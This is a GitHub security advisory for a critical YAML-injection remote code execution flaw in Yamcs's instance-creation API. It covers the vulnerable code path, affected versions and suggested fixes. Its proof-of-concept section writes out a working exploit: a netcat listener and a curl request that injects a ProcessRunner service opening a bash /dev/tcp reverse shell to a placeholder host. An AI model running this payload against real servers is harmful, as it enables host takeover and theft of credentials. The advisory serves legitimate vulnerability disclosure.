# [C] Yamcs vulnerable to Remote Code Execution via instance-template argument YAML injection (createInstance)

## Summary
Severity: Critical
Advisory: GHSA-73mf-m39p-wpm9
CVE: CVE-2026-55559
CWE: CWE-1336, CWE-470, CWE-94
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-08-28
Source: https://github.com/advisories/GHSA-73mf-m39p-wpm9
Type: github-advisory

## Affected
- Maven: `org.yamcs:yamcs-core` — affected >=5.13.0 <5.13.2
- Maven: `org.yamcs:yamcs-core` — affected >=0 <5.12.8

## Details
### Summary

`templateArgs` sent to `POST /api/instances` (and `PATCH /api/instances/{instance}`) are written into the rendered instance config as raw text, then parsed as YAML and loaded. Yamcs instantiates each `services:` entry by its `class:`, so injecting YAML through a template arg lets you add a `services:` entry for `org.yamcs.ProcessRunner` and run a command on the host. The args aren't escaped for YAML or validated server-side.

Needs the `CreateInstances` privilege. With no `security.yaml` the `guest` user is `superuser=true` and the API is unauthenticated, so it's reachable without auth, same default exposure as CVE-2026-46562. The 5.12.7 algorithm-edit fix doesn't touch this path.

### Details

`VarStatement` appends arg values with no escaping:

```java
// yamcs-core/src/main/java/org/yamcs/templating/VarStatement.java:29
buf.append(value);
```

The only filter, `EscapeFilter`, does HTML escaping (`& < > ' "`) and leaves newlines, colons and indentation alone, so `{{ x | escape }}` doesn't help either. `InstancesApi.createInstance` forwards the args without checking them against the declared variables; the `choices` / `required` metadata is only used to render the web form.

Request to exec:
`InstancesApi.createInstance` (`http/api/InstancesApi.java:169`, checks `CreateInstances`)
→ `YamcsServer.createInstance` (`YamcsServer.java:651`, `template.process(templateArgs)`)
→ rendered config loaded as `YConfiguration`
→ `YamcsServerInstance` instantiates `services:` by `class:` (`YamcsServerInstance.java:75,88`, via `YObjectLoader`)
→ `org.yamcs.ProcessRunner` runs `new ProcessBuilder(command).start()` (`ProcessRunner.java:81-82`).

`createInstance` has no field for a class name or raw config, and no other API instantiates an arbitrary class at runtime (`ServicesApi` only starts/stops existing ones), so the template arg is the only way in.

A fix would be to validate `templateArgs` (reject newlines / control characters, enforce the declared `choices` / `required`) and/or escape substituted values for the YAML context.

### PoC

Run the shipped example: `./run-example.sh templates`. It serves `HttpServer` on 8090 with no `security.yaml`, so guest is superuser and the API is unauthenticated. Its `example` template puts `{{ spaceSystem }}` into `name: "..."`.

Listener:

```
nc -lvnp 4444
```

Request (set `<LHOST>` / `<LPORT>` to the listener):

```bash
curl -i -X POST http://<target>:8090/api/instances \
  -H 'Content-Type: application/json' \
  -d '{
    "name": "pwned",
    "template": "example",
    "templateArgs": {
      "spaceSystem": "x\"\nservices:\n  - class: org.yamcs.ProcessRunner\n    args:\n      command: [\"bash\", \"-c\", \"exec 3<>/dev/tcp/<LHOST>/<LPORT>; sh -i <&3 >&3 2>&3\"]\n#",
      "bar": "Option 2"
    }
  }'
```

Returns 200; the new instance starts the injected ProcessRunner, which connects back to the listener with a shell running as the Yamcs user (`id` shows the service account). The arg closes the `name: "..."` quote, adds a top-level `services:` (which overrides the template's `services: []`, last key wins in SnakeYAML), and ends with `#` to comment out the trailing `"`.

With `security.yaml` it's the same request with a bearer token. This works for a user whose only privilege is `CreateInstances`: that user gets 403 (`Missing system privilege 'ChangeMissionDatabase'`) on the algorithm-override path but 200 here.

### Impact

Command execution as the Yamcs service account. That includes reading `secretKey` from `etc/yamcs.yaml` (which lets you mint tokens for any user including a superuser), reading other secrets (LDAP bind, OIDC client secret, TLS keys), and reading or tampering with telemetry and command history for every instance on the box.

It needs `CreateInstances`, or no auth at all in the default config. On a server that delegates that privilege to operators who shouldn't have a shell, or that runs without `security.yaml`, this is host takeover from the API.

## References
- https://github.com/yamcs/yamcs/security/advisories/GHSA-73mf-m39p-wpm9
- https://github.com/yamcs/yamcs/commit/549f295cf8c5496a5e799d6bec2432ef976c82aa
- https://github.com/yamcs/yamcs/commit/7192da1c49bdf5ab1d72e579a47766a7c43e87c8
- https://github.com/yamcs/yamcs
- https://github.com/yamcs/yamcs/releases/tag/yamcs-5.12.8
- https://github.com/yamcs/yamcs/releases/tag/yamcs-5.13.2
